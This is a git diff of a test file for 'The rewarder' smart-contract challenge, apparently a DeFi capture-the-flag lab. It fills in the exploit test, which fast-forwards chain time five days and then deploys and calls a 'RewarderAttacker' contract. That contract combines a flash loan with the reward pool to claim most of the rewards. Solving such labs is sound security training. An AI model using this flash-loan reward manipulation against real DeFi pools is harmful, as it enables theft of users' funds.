@@ -66,7 +66,21 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // you must claim most rewards for yourself.
+        //等5天
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        const RewarderAttackerFactory = await ethers.getContractFactory('RewarderAttacker', attacker);
+        const rewarderAttackerContract = await RewarderAttackerFactory.deploy(
+            this.rewarderPool.address,
+            this.flashLoanPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address
+        );
+        await rewarderAttackerContract.attack();
+
     });
+    
 
     after(async function () {
         /** SUCCESS CONDITIONS */
